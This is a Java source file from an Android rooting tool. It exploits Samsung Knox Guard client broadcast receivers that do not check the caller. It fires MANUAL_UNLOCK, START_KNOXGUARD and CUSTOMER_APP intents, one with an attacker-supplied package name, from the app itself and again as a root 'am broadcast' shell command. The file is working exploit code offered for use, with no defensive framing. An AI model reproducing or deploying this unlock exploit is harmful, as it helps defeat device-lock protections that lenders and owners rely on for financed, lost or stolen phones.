package df.root;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * App-domain Knox Guard nudges found in the decompiled kgclient receivers.
 *
 * ServiceIntentReceiver handles MANUAL_UNLOCK without a caller check and
 * emits KNOXGUARD_UNLOCKED. KGKesReceiver handles START_KNOXGUARD and
 * KGIntentReceiver handles CUSTOMER_APP with an attacker-supplied package.
 * None of them verify the caller in code, so this sends the three intents
 * both from the app and through root as a fallback. Every nudge is
 * best-effort: the HAL/Java unlock in Runner is still the primary path.
 */
final class KgBroadcast {

    private static final String TAG = "dfroot";
    private static final String CLIENT = "com.samsung.android.kgclient";
    private static final String CUSTOMER_PACKAGE = "df.root";

    private static final String[][] NUDGES = {
            {
                    "unlock",
                    "com.samsung.kgclient.android.intent.action.MANUAL_UNLOCK",
                    ".receiver.ServiceIntentReceiver",
                    null,
            },
            {
                    "start",
                    "com.sec.enterprise.knox.cloudmdm.smdms.intent.action.START_KNOXGUARD",
                    ".receiver.KGKesReceiver",
                    null,
            },
            {
                    "customer",
                    "com.samsung.kgclient.intent.action.CUSTOMER_APP",
                    ".receiver.KGIntentReceiver",
                    CUSTOMER_PACKAGE,
            },
    };

    private KgBroadcast() {
    }

    /** Fire the app-domain nudges at startup, before root exists. */
    static void appOnly(final Context ctx) {
        Thread t = new Thread(() -> {
            for (String[] nudge : NUDGES) {
                Log.i(TAG, "[kg-broadcast] " + nudge[0]
                        + " app=" + appNudge(ctx, nudge[1], nudge[3]));
            }
        }, "dfroot-kg");
        t.setDaemon(true);
        t.start();
    }

    /** Returns lines ready for the run log; never throws. */
    static String apply(Context ctx) {
        StringBuilder out = new StringBuilder();
        for (String[] nudge : NUDGES) {
            String label = nudge[0];
            String action = nudge[1];
            String receiver = nudge[2];
            String extra = nudge[3];

            String app = appNudge(ctx, action, extra);
            String shell = "am broadcast --user 0 -a " + action
                    + " -p " + CLIENT + " -n " + CLIENT + "/" + receiver;
            if (extra != null) {
                shell += " --es customerPackageName " + extra;
            }
            String root = Runner.suScript(20L, shell);
            out.append("[kg-broadcast] ")
                    .append(label)
                    .append(" app=").append(app)
                    .append(" root=").append(oneLine(root))
                    .append('\n');
        }
        return out.toString();
    }

    private static String appNudge(Context ctx, String action, String extra) {
        try {
            Intent intent = new Intent(action).setPackage(CLIENT);
            if (extra != null) {
                intent.putExtra("customerPackageName", extra);
            }
            ctx.sendBroadcast(intent);
            return "sent";
        } catch (Throwable t) {
            Log.w(TAG, "kg broadcast " + action + ": " + t);
            return "blocked";
        }
    }

    private static String oneLine(String value) {
        if (value == null || value.trim().isEmpty()) {
            return "no-reply";
        }
        String flat = value.trim().replace('\n', ' ');
        return flat.length() > 140 ? flat.substring(0, 140) + "..." : flat;
    }
}
